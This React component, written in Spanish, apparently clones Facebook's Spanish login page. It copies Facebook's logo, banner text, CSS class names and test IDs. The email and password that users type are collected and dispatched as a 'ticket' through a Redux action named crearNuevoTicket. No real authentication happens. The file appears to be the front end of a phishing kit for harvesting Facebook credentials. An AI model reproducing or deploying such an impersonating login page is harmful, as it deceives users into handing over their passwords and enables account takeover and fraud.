import React, { useState, useEffect } from 'react';
import "./home.css"
import fbimg from "../../assets/img/fblogo.svg"
import { useDispatch, useSelector} from 'react-redux';

import { crearNuevoTicket } from "./actions/nuevo";

const Home = () => {
    let [correo, guardadremial] = useState('');
    let [contraseña, guardadrcontraseña] = useState('');

    const dispatch = useDispatch();
  
    // Aceder al state del store
    const cargando = useSelector(state => state.nuevodato.loading);
    const error = useSelector(state => state.nuevodato.error);
  
   
  
    //llamar Action 
  
    // obtener State 
    const agregaremisor = (Ticket) => dispatch( crearNuevoTicket(Ticket) );
  
  
    const agregarticketp = e => {
        e.preventDefault();
  
        // Validar Formulario
  
        // Verificar Errores
  
        // Crear Nuevo Emisor
        
        agregaremisor({
            correo,
            contraseña
        });
        // // Redirecionar
         
    }
    
    return (
        <div className="bodyhome">
            <div className="headerhome">
                <div className="headerbodyicon">
                    <i className="sp_xm9DDmY7HAL_3x"></i>
                </div>
                <div className="headerbodytext">
                    <p>Descárgate Facebook para Android y navega más rápido.</p>    
                </div>
            </div>

            <section className="bodyfrom">
                <div className="bodyfrombody">
                        <div className="bodyfromleft">
                                <div className="fromimg" id="imgmovil">
                                    <img src={fbimg}></img>
                                </div>
                                <div className="fromtextimg">
                                    <h2>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
                                </div>
                        </div>

                        <div className="containerrigt">
                            <div className="bodyfromright">
                            <div className="bodyformfrom">
                                <form onSubmit={agregarticketp}>
                               <div className="frominputmail">
                               <input
                                value={correo}
                                onChange={e => guardadremial(e.target.value)}
                               type="text" className="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Correo electrónico o número de teléfono" autofocus="1" aria-label="Correo electrónico o número de teléfono">
                               </input>
                               </div>

                               <div className="frominputmailmovil">
                               <input 
                                 value={correo}
                                 onChange={e => guardadremial(e.target.value)}
                               type="text" className="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Número de móvil o correo electrónico" autofocus="1" aria-label="Correo electrónico o número de teléfono">
                               </input>
                               </div>
                               <div className="frominputpass">
                               <input 
                                value={contraseña}
                                onChange={e => guardadrcontraseña(e.target.value)}
                                type="password" className="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal_pass" placeholder="Contraseña" aria-label="Contraseña"></input>
                               </div>

                               <div className="frominputpassmovil">
                               <input  
                                 value={contraseña}
                                 onChange={e => guardadrcontraseña(e.target.value)}
                                 type="password" className="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal_pass" placeholder="Contraseña" aria-label="Contraseña"></input>
                               </div>
                               <button
        type="submit"
        className="entrarbuton">
            Entrar
        </button>

        <button
        type="submit"
        className="entrarbutonmovil">
            Entrar
        </button>

        <div className="cuentanueva">
        <a className="fkpla">¿Has olvidado la contraseña?</a>
        </div>
        <div className="divisionseparatoria">
        <hr></hr>
        </div>

        <div className="divisionseparatoriamovil">
            <p>o</p>
        </div>
        <div className="separadorbottones"></div>
        <button
        className="nuevacuenta">
            Crear cuenta nueva
        </button>

        <button
        className="nuevacuentamovil">
            Crear cuenta nueva
        </button>
        <div className="cuentanuevamovil">
        <a className="fkplamovil">¿Has olvidado la contraseña?</a>
        </div>


                               </form>
                              
                            </div>
                            
                        </div>
                        <div className="contentfromfoot">
                              <p> <span>Crea una página</span> para un personaje público, un grupo de música o un negocio</p>
                              </div>
                </div>
                </div>

              
            </section>
        </div>
    )
}

export default Home
